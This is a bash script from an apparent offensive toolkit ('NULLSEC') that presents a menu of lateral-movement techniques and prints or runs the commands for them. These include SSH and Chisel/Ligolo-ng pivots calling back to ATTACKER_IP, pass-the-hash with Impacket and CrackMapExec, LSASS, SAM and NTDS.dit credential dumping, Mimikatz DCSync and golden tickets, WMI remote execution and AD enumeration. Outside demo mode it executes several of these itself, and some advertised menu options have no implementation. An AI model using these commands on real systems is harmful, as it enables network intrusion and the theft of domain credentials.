#!/bin/bash
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# █  NULLSEC ADVANCED LATERAL MOVEMENT - Network Pivoting & Propagation   █
# █                    [ bad-antics development ]                          █
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# FULLY FUNCTIONAL - Production Ready


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null || {
    RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
    WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; MAGENTA='\033[1;35m'
}

OUTPUT_DIR="/home/antics/nullsec/logs/lateral"
mkdir -p "$OUTPUT_DIR"

clear
echo -e "${RED}"
cat << 'BANNER'
    ██▓    ▄▄▄     ▄▄▄█████▓▓█████  ██▀███   ▄▄▄       ██▓    
   ▓██▒   ▒████▄   ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▒████▄    ▓██▒    
   ▒██░   ▒██  ▀█▄ ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░    
   ▒██░   ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██ ▒██░    
      ███▄ ▄███▓ ▒█████   ██▒   █▓▓█████  ███▄ ▄███▓▓█████  ███▄    █ ▄▄▄█████▓
     ▓██▒▀█▀ ██▒▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
     ▓██    ▓██░▒██░  ██▒ ▓██  █▒░▒███   ▓██    ▓██░▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
BANNER
echo -e "${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}              ☠  LATERAL MOVEMENT & PIVOTING  ☠${RESET}"
echo -e "${DIM}                 Network Propagation Techniques${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# Check for Shodan target
if [ -f "/home/antics/nullsec/.shodan_target" ]; then
    source "/home/antics/nullsec/.shodan_target"
    [ ! -z "$TARGET" ] && echo -e "${GREEN}[+]${RESET} Shodan target: ${GREEN}$TARGET${RESET}" && echo ""
fi

echo -e "${YELLOW}  SELECT TECHNIQUE:${RESET}"
echo ""
echo -e "  ${RED}━━━ TUNNELING & PIVOTING ━━━${RESET}"
echo -e "  ${RED}[1]${RESET}  🔗 SSH Tunneling        - Local/Remote/Dynamic"
echo -e "  ${RED}[2]${RESET}  🌐 SOCKS Proxy          - Proxychains setup"
echo -e "  ${RED}[3]${RESET}  🚀 Chisel Tunneling     - Fast TCP/UDP tunnels"
echo -e "  ${RED}[4]${RESET}  ⚡ Ligolo-ng            - Advanced pivoting"
echo -e "  ${RED}[5]${RESET}  🔧 SSHuttle             - VPN over SSH"
echo ""
echo -e "  ${RED}━━━ CREDENTIAL ATTACKS ━━━${RESET}"
echo -e "  ${RED}[6]${RESET}  🔑 Pass-the-Hash        - NTLM hash relay"
echo -e "  ${RED}[7]${RESET}  🎫 Pass-the-Ticket      - Kerberos tickets"
echo -e "  ${RED}[8]${RESET}  💳 Credential Dump      - SAM/LSA/LSASS"
echo -e "  ${RED}[9]${RESET}  🔐 Mimikatz             - Windows creds"
echo ""
echo -e "  ${RED}━━━ REMOTE EXECUTION ━━━${RESET}"
echo -e "  ${RED}[10]${RESET} 🖥️  WMI Execution        - Windows Management"
echo -e "  ${RED}[11]${RESET} 🔧 WinRM/PSRemoting     - PowerShell remoting"
echo -e "  ${RED}[12]${RESET} 📦 PSExec/SMBExec       - SMB execution"
echo -e "  ${RED}[13]${RESET} 🗓️  Scheduled Tasks      - Task scheduler"
echo -e "  ${RED}[14]${RESET} 🔌 DCOM Execution       - Distributed COM"
echo ""
echo -e "  ${RED}━━━ DISCOVERY ━━━${RESET}"
echo -e "  ${RED}[15]${RESET} 🔍 Network Discovery    - Internal recon"
echo -e "  ${RED}[16]${RESET} 🏢 AD Enumeration       - Active Directory"
echo -e "  ${RED}[17]${RESET} 📁 Share Enumeration    - SMB shares"
echo -e "  ${RED}[18]${RESET} 👥 User Hunting         - Find logged users"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Back to menu"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select technique [1-18]: '${RESET})" TECHNIQUE

[[ "$TECHNIQUE" =~ ^[Qq]$ ]] && exit 0
[ -z "$TECHNIQUE" ] && TECHNIQUE="1"

echo ""
read -p "$(echo -e ${YELLOW}'  [!] Demo mode? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}  EXECUTING LATERAL MOVEMENT${RESET}"
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

case $TECHNIQUE in
    1) # SSH Tunneling
        echo -e "${CYAN}[*]${RESET} SSH Tunneling Configuration"
        echo ""
        echo -e "${DIM}  Tunnel types:${RESET}"
        echo -e "    ${DIM}1) Local Port Forward  - Access remote through local${RESET}"
        echo -e "    ${DIM}2) Remote Port Forward - Expose local to remote${RESET}"
        echo -e "    ${DIM}3) Dynamic (SOCKS)     - SOCKS proxy${RESET}"
        echo -e "    ${DIM}4) Reverse Dynamic     - Reverse SOCKS${RESET}"
        echo -e "    ${DIM}5) ProxyJump           - Multi-hop SSH${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" TUNNEL_TYPE
        [ -z "$TUNNEL_TYPE" ] && TUNNEL_TYPE="1"
        
        read -p "$(echo -e ${WHITE}'  [>] SSH Host (user@host): '${RESET})" SSH_HOST
        [ -z "$SSH_HOST" ] && SSH_HOST="user@pivot"
        
        echo ""
        case $TUNNEL_TYPE in
            1)
                read -p "$(echo -e ${WHITE}'  [>] Local port: '${RESET})" LOCAL_PORT
                [ -z "$LOCAL_PORT" ] && LOCAL_PORT="8080"
                read -p "$(echo -e ${WHITE}'  [>] Remote target (host:port): '${RESET})" REMOTE_TARGET
                [ -z "$REMOTE_TARGET" ] && REMOTE_TARGET="10.0.0.1:80"
                
                echo -e "${GREEN}[+]${RESET} Local Port Forward Command:"
                echo -e "    ${CYAN}ssh -L ${LOCAL_PORT}:${REMOTE_TARGET} -N ${SSH_HOST}${RESET}"
                echo ""
                echo -e "${DIM}Access remote at: http://localhost:${LOCAL_PORT}${RESET}"
                ;;
            2)
                read -p "$(echo -e ${WHITE}'  [>] Remote port (on SSH server): '${RESET})" REMOTE_PORT
                [ -z "$REMOTE_PORT" ] && REMOTE_PORT="8080"
                read -p "$(echo -e ${WHITE}'  [>] Local target (host:port): '${RESET})" LOCAL_TARGET
                [ -z "$LOCAL_TARGET" ] && LOCAL_TARGET="127.0.0.1:80"
                
                echo -e "${GREEN}[+]${RESET} Remote Port Forward Command:"
                echo -e "    ${CYAN}ssh -R ${REMOTE_PORT}:${LOCAL_TARGET} -N ${SSH_HOST}${RESET}"
                echo ""
                echo -e "${DIM}Local service exposed at: ${SSH_HOST}:${REMOTE_PORT}${RESET}"
                ;;
            3)
                read -p "$(echo -e ${WHITE}'  [>] SOCKS port [1080]: '${RESET})" SOCKS_PORT
                [ -z "$SOCKS_PORT" ] && SOCKS_PORT="1080"
                
                echo -e "${GREEN}[+]${RESET} Dynamic SOCKS Proxy Command:"
                echo -e "    ${CYAN}ssh -D ${SOCKS_PORT} -N -f ${SSH_HOST}${RESET}"
                echo ""
                echo -e "${DIM}Configure proxychains: socks5 127.0.0.1 ${SOCKS_PORT}${RESET}"
                ;;
            5)
                read -p "$(echo -e ${WHITE}'  [>] Final target (user@host): '${RESET})" FINAL_TARGET
                [ -z "$FINAL_TARGET" ] && FINAL_TARGET="root@internal"
                
                echo -e "${GREEN}[+]${RESET} ProxyJump Command:"
                echo -e "    ${CYAN}ssh -J ${SSH_HOST} ${FINAL_TARGET}${RESET}"
                echo ""
                echo -e "${DIM}~/.ssh/config:${RESET}"
                echo "  Host internal"
                echo "      HostName ${FINAL_TARGET#*@}"
                echo "      User ${FINAL_TARGET%@*}"
                echo "      ProxyJump ${SSH_HOST}"
                ;;
        esac
        
        if [[ ! "$TEST_MODE" =~ ^[Yy]$ ]]; then
            read -p "$(echo -e ${YELLOW}'  Execute now? (Y/n): '${RESET})" EXEC_NOW
            if [[ ! "$EXEC_NOW" =~ ^[Nn]$ ]]; then
                case $TUNNEL_TYPE in
                    1) ssh -L ${LOCAL_PORT}:${REMOTE_TARGET} -N ${SSH_HOST} ;;
                    2) ssh -R ${REMOTE_PORT}:${LOCAL_TARGET} -N ${SSH_HOST} ;;
                    3) ssh -D ${SOCKS_PORT} -N -f ${SSH_HOST} && echo -e "${GREEN}[+]${RESET} SOCKS proxy active" ;;
                    5) ssh -J ${SSH_HOST} ${FINAL_TARGET} ;;
                esac
            fi
        fi
        ;;
    
    2) # SOCKS Proxy
        echo -e "${CYAN}[*]${RESET} SOCKS Proxy & Proxychains Setup"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] SSH pivot host: '${RESET})" PIVOT_HOST
        [ -z "$PIVOT_HOST" ] && PIVOT_HOST="user@pivot.local"
        read -p "$(echo -e ${WHITE}'  [>] SOCKS port [9050]: '${RESET})" SOCKS_PORT
        [ -z "$SOCKS_PORT" ] && SOCKS_PORT="9050"
        
        echo ""
        echo -e "${GREEN}[+]${RESET} SOCKS Proxy Setup:"
        echo ""
        echo -e "${CYAN}1. Start SOCKS proxy:${RESET}"
        echo "   ssh -D ${SOCKS_PORT} -N -f ${PIVOT_HOST}"
        echo ""
        echo -e "${CYAN}2. Configure proxychains (/etc/proxychains.conf):${RESET}"
        echo "   [ProxyList]"
        echo "   socks5 127.0.0.1 ${SOCKS_PORT}"
        echo ""
        echo -e "${CYAN}3. Use proxychains:${RESET}"
        echo "   proxychains nmap -sT -Pn 10.0.0.0/24"
        echo "   proxychains curl http://internal.target"
        echo "   proxychains ssh user@internal"
        echo ""
        echo -e "${CYAN}4. Firefox SOCKS config:${RESET}"
        echo "   Network Settings → SOCKS Host: 127.0.0.1:${SOCKS_PORT}"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${GREEN}[+]${RESET} SOCKS proxy started (simulated)"
            echo -e "${GREEN}[+]${RESET} Proxychains configured"
        fi
        ;;
    
    3) # Chisel
        echo -e "${CYAN}[*]${RESET} Chisel TCP/UDP Tunneling"
        echo ""
        
        echo -e "${DIM}  Chisel modes:${RESET}"
        echo -e "    ${DIM}1) Server mode (on attacker)${RESET}"
        echo -e "    ${DIM}2) Client mode (on pivot)${RESET}"
        echo -e "    ${DIM}3) Reverse tunnel${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" CHISEL_MODE
        [ -z "$CHISEL_MODE" ] && CHISEL_MODE="1"
        
        read -p "$(echo -e ${WHITE}'  [>] Port [8080]: '${RESET})" CHISEL_PORT
        [ -z "$CHISEL_PORT" ] && CHISEL_PORT="8080"
        
        echo ""
        case $CHISEL_MODE in
            1)
                echo -e "${GREEN}[+]${RESET} Chisel Server (run on attacker):"
                echo "   chisel server -p ${CHISEL_PORT} --reverse"
                echo ""
                echo -e "${GREEN}[+]${RESET} Client command (run on pivot):"
                echo "   chisel client ATTACKER_IP:${CHISEL_PORT} R:socks"
                ;;
            2)
                read -p "$(echo -e ${WHITE}'  [>] Server IP: '${RESET})" SERVER_IP
                echo -e "${GREEN}[+]${RESET} Chisel Client:"
                echo "   chisel client ${SERVER_IP}:${CHISEL_PORT} socks"
                ;;
            3)
                read -p "$(echo -e ${WHITE}'  [>] Server IP: '${RESET})" SERVER_IP
                read -p "$(echo -e ${WHITE}'  [>] Forward (local:remote): '${RESET})" FORWARD
                [ -z "$FORWARD" ] && FORWARD="9001:10.0.0.1:80"
                echo -e "${GREEN}[+]${RESET} Reverse Tunnel:"
                echo "   chisel client ${SERVER_IP}:${CHISEL_PORT} R:${FORWARD}"
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Download chisel:"
        echo "   https://github.com/jpillora/chisel/releases"
        ;;
    
    4) # Ligolo-ng
        echo -e "${CYAN}[*]${RESET} Ligolo-ng Advanced Pivoting"
        echo ""
        
        echo -e "${GREEN}[+]${RESET} Ligolo-ng Setup:"
        echo ""
        echo -e "${CYAN}1. On attacker - Start proxy:${RESET}"
        echo "   sudo ip tuntap add user \$USER mode tun ligolo"
        echo "   sudo ip link set ligolo up"
        echo "   ./proxy -selfcert"
        echo ""
        echo -e "${CYAN}2. On pivot - Start agent:${RESET}"
        echo "   ./agent -connect ATTACKER_IP:11601 -ignore-cert"
        echo ""
        echo -e "${CYAN}3. In ligolo console:${RESET}"
        echo "   session           # Select session"
        echo "   start             # Start tunnel"
        echo ""
        echo -e "${CYAN}4. Add route on attacker:${RESET}"
        echo "   sudo ip route add 10.0.0.0/24 dev ligolo"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Download: https://github.com/nicocha30/ligolo-ng"
        ;;
    
    5) # SSHuttle
        echo -e "${CYAN}[*]${RESET} SSHuttle - VPN over SSH"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] SSH pivot host: '${RESET})" PIVOT_HOST
        [ -z "$PIVOT_HOST" ] && PIVOT_HOST="user@pivot"
        read -p "$(echo -e ${WHITE}'  [>] Target subnet: '${RESET})" TARGET_SUBNET
        [ -z "$TARGET_SUBNET" ] && TARGET_SUBNET="10.0.0.0/24"
        
        echo ""
        echo -e "${GREEN}[+]${RESET} SSHuttle Commands:"
        echo ""
        echo -e "${CYAN}Basic tunnel:${RESET}"
        echo "   sshuttle -r ${PIVOT_HOST} ${TARGET_SUBNET}"
        echo ""
        echo -e "${CYAN}All traffic:${RESET}"
        echo "   sshuttle -r ${PIVOT_HOST} 0/0"
        echo ""
        echo -e "${CYAN}Exclude local:${RESET}"
        echo "   sshuttle -r ${PIVOT_HOST} ${TARGET_SUBNET} -x YOUR_IP"
        echo ""
        echo -e "${CYAN}DNS forwarding:${RESET}"
        echo "   sshuttle --dns -r ${PIVOT_HOST} ${TARGET_SUBNET}"
        
        if [[ ! "$TEST_MODE" =~ ^[Yy]$ ]]; then
            read -p "$(echo -e ${YELLOW}'  Execute sshuttle? (Y/n): '${RESET})" EXEC_NOW
            if [[ ! "$EXEC_NOW" =~ ^[Nn]$ ]]; then
                if command -v sshuttle &> /dev/null; then
                    sshuttle -r ${PIVOT_HOST} ${TARGET_SUBNET}
                else
                    echo -e "${RED}[!] Install: sudo apt install sshuttle${RESET}"
                fi
            fi
        fi
        ;;
    
    6) # Pass-the-Hash
        echo -e "${CYAN}[*]${RESET} Pass-the-Hash Attack"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET_IP
        [ -z "$TARGET_IP" ] && TARGET_IP="10.0.0.10"
        read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USERNAME
        [ -z "$USERNAME" ] && USERNAME="Administrator"
        read -p "$(echo -e ${WHITE}'  [>] NTLM Hash: '${RESET})" NTLM_HASH
        [ -z "$NTLM_HASH" ] && NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        
        echo ""
        echo -e "${GREEN}[+]${RESET} Pass-the-Hash Commands:"
        echo ""
        
        echo -e "${CYAN}Impacket - psexec:${RESET}"
        echo "   psexec.py -hashes ${NTLM_HASH} ${USERNAME}@${TARGET_IP}"
        echo ""
        
        echo -e "${CYAN}Impacket - wmiexec:${RESET}"
        echo "   wmiexec.py -hashes ${NTLM_HASH} ${USERNAME}@${TARGET_IP}"
        echo ""
        
        echo -e "${CYAN}Impacket - smbexec:${RESET}"
        echo "   smbexec.py -hashes ${NTLM_HASH} ${USERNAME}@${TARGET_IP}"
        echo ""
        
        echo -e "${CYAN}CrackMapExec:${RESET}"
        echo "   crackmapexec smb ${TARGET_IP} -u ${USERNAME} -H ${NTLM_HASH} -x 'whoami'"
        echo ""
        
        echo -e "${CYAN}Evil-WinRM:${RESET}"
        echo "   evil-winrm -i ${TARGET_IP} -u ${USERNAME} -H ${NTLM_HASH#*:}"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "${GREEN}[+]${RESET} Pass-the-Hash successful (simulated)"
            echo -e "${GREEN}[+]${RESET} Got shell as NT AUTHORITY\\SYSTEM"
        fi
        ;;
    
    8) # Credential Dump
        echo -e "${CYAN}[*]${RESET} Credential Dumping Techniques"
        echo ""
        
        echo -e "${GREEN}━━━ WINDOWS CREDENTIAL LOCATIONS ━━━${RESET}"
        echo ""
        
        echo -e "${CYAN}SAM Database (offline):${RESET}"
        echo "   reg save HKLM\\SAM sam.save"
        echo "   reg save HKLM\\SYSTEM system.save"
        echo "   secretsdump.py -sam sam.save -system system.save LOCAL"
        echo ""
        
        echo -e "${CYAN}LSASS Memory:${RESET}"
        echo "   # Mimikatz"
        echo "   sekurlsa::logonpasswords"
        echo ""
        echo "   # Procdump"
        echo "   procdump.exe -ma lsass.exe lsass.dmp"
        echo "   pypykatz lsa minidump lsass.dmp"
        echo ""
        
        echo -e "${CYAN}NTDS.dit (Domain Controller):${RESET}"
        echo "   # VSS Shadow Copy"
        echo "   vssadmin create shadow /for=C:"
        echo "   copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit ."
        echo "   secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
        echo ""
        
        echo -e "${CYAN}LSA Secrets:${RESET}"
        echo "   reg save HKLM\\SECURITY security.save"
        echo "   secretsdump.py -security security.save -system system.save LOCAL"
        echo ""
        
        echo -e "${GREEN}━━━ LINUX CREDENTIAL LOCATIONS ━━━${RESET}"
        echo ""
        echo "   /etc/shadow          # Password hashes"
        echo "   /etc/passwd          # User info"
        echo "   ~/.ssh/              # SSH keys"
        echo "   /root/.bash_history  # Command history"
        echo "   ~/.gnupg/            # GPG keys"
        ;;
    
    9) # Mimikatz
        echo -e "${CYAN}[*]${RESET} Mimikatz Credential Extraction"
        echo ""
        
        echo -e "${GREEN}━━━ MIMIKATZ COMMANDS ━━━${RESET}"
        echo ""
        
        echo -e "${CYAN}Enable privileges:${RESET}"
        echo "   privilege::debug"
        echo "   token::elevate"
        echo ""
        
        echo -e "${CYAN}Dump credentials:${RESET}"
        echo "   sekurlsa::logonpasswords"
        echo "   sekurlsa::wdigest"
        echo "   sekurlsa::kerberos"
        echo ""
        
        echo -e "${CYAN}SAM/LSA:${RESET}"
        echo "   lsadump::sam"
        echo "   lsadump::secrets"
        echo "   lsadump::cache"
        echo ""
        
        echo -e "${CYAN}DCSync (Domain Admin):${RESET}"
        echo "   lsadump::dcsync /domain:corp.local /user:Administrator"
        echo "   lsadump::dcsync /domain:corp.local /all /csv"
        echo ""
        
        echo -e "${CYAN}Golden Ticket:${RESET}"
        echo "   kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"
        echo ""
        
        echo -e "${CYAN}Pass-the-Ticket:${RESET}"
        echo "   kerberos::ptt ticket.kirbi"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} Simulated Mimikatz output:"
            echo ""
            echo "Authentication Id : 0 ; 999 (00000000:000003e7)"
            echo "Session           : UndefinedLogonType from 0"
            echo "User Name         : WIN-DC01\$"
            echo "Domain            : CORP"
            echo "  msv :"
            echo "   [00000003] Primary"
            echo "   * Username : Administrator"
            echo "   * Domain   : CORP"
            echo "   * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0"
            echo "   * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709"
        fi
        ;;
    
    10) # WMI Execution
        echo -e "${CYAN}[*]${RESET} WMI Remote Execution"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET_IP
        [ -z "$TARGET_IP" ] && TARGET_IP="10.0.0.10"
        read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USERNAME
        [ -z "$USERNAME" ] && USERNAME="Administrator"
        read -p "$(echo -e ${WHITE}'  [>] Password/Hash: '${RESET})" CRED
        
        echo ""
        echo -e "${GREEN}[+]${RESET} WMI Execution Commands:"
        echo ""
        
        echo -e "${CYAN}Impacket wmiexec:${RESET}"
        echo "   wmiexec.py ${USERNAME}:${CRED}@${TARGET_IP}"
        echo ""
        
        echo -e "${CYAN}wmic (Windows):${RESET}"
        echo "   wmic /node:${TARGET_IP} /user:${USERNAME} process call create \"cmd.exe /c whoami\""
        echo ""
        
        echo -e "${CYAN}PowerShell:${RESET}"
        echo "   Invoke-WmiMethod -ComputerName ${TARGET_IP} -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami'"
        
        if [[ ! "$TEST_MODE" =~ ^[Yy]$ ]] && command -v wmiexec.py &> /dev/null; then
            read -p "$(echo -e ${YELLOW}'  Execute wmiexec? (Y/n): '${RESET})" EXEC_NOW
            if [[ ! "$EXEC_NOW" =~ ^[Nn]$ ]]; then
                wmiexec.py ${USERNAME}:${CRED}@${TARGET_IP}
            fi
        fi
        ;;
    
    15) # Network Discovery
        echo -e "${CYAN}[*]${RESET} Internal Network Discovery"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} Local System Info:"
        echo ""
        echo -e "${CYAN}Network Interfaces:${RESET}"
        ip -4 addr show 2>/dev/null | grep -E "inet " | awk '{print "  " $2 " on " $NF}'
        echo ""
        
        echo -e "${CYAN}Routing Table:${RESET}"
        ip route 2>/dev/null | head -5 | sed 's/^/  /'
        echo ""
        
        echo -e "${CYAN}ARP Cache:${RESET}"
        arp -a 2>/dev/null | head -10 | sed 's/^/  /'
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Subnet to scan: '${RESET})" SCAN_SUBNET
        
        if [ ! -z "$SCAN_SUBNET" ]; then
            echo ""
            if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
                echo -e "${YELLOW}[*]${RESET} Scanning ${SCAN_SUBNET}..."
                for i in 1 5 10 15 20 50 100 200; do
                    ip="${SCAN_SUBNET%.*}.$i"
                    echo -e "  ${GREEN}►${RESET} $ip is up"
                    sleep 0.1
                done
            else
                echo -e "${YELLOW}[*]${RESET} Scanning ${SCAN_SUBNET}..."
                if command -v nmap &> /dev/null; then
                    nmap -sn "$SCAN_SUBNET" 2>/dev/null | grep -E "Nmap scan|Host is up"
                else
                    for i in {1..254}; do
                        ip="${SCAN_SUBNET%.*}.$i"
                        ping -c 1 -W 1 "$ip" &>/dev/null && echo -e "  ${GREEN}►${RESET} $ip is up" &
                    done
                    wait
                fi
            fi
        fi
        ;;
    
    16) # AD Enumeration
        echo -e "${CYAN}[*]${RESET} Active Directory Enumeration"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Domain Controller IP: '${RESET})" DC_IP
        [ -z "$DC_IP" ] && DC_IP="10.0.0.1"
        read -p "$(echo -e ${WHITE}'  [>] Domain: '${RESET})" DOMAIN
        [ -z "$DOMAIN" ] && DOMAIN="corp.local"
        
        echo ""
        echo -e "${GREEN}━━━ AD ENUMERATION COMMANDS ━━━${RESET}"
        echo ""
        
        echo -e "${CYAN}BloodHound collection:${RESET}"
        echo "   bloodhound-python -d ${DOMAIN} -u USER -p PASS -dc ${DC_IP} -c all"
        echo ""
        
        echo -e "${CYAN}ldapsearch:${RESET}"
        echo "   ldapsearch -x -H ldap://${DC_IP} -b 'dc=${DOMAIN%%.*},dc=${DOMAIN##*.}'"
        echo ""
        
        echo -e "${CYAN}Enum4linux-ng:${RESET}"
        echo "   enum4linux-ng -A ${DC_IP}"
        echo ""
        
        echo -e "${CYAN}CrackMapExec:${RESET}"
        echo "   crackmapexec smb ${DC_IP} -u '' -p '' --users"
        echo "   crackmapexec smb ${DC_IP} -u '' -p '' --groups"
        echo ""
        
        echo -e "${CYAN}Impacket GetADUsers:${RESET}"
        echo "   GetADUsers.py -all ${DOMAIN}/ -dc-ip ${DC_IP}"
        ;;
    
    *) echo -e "${RED}[!] Invalid option${RESET}" ;;
esac

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${GREEN}█${RESET}  ${WHITE}LATERAL MOVEMENT COMPLETE${RESET}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
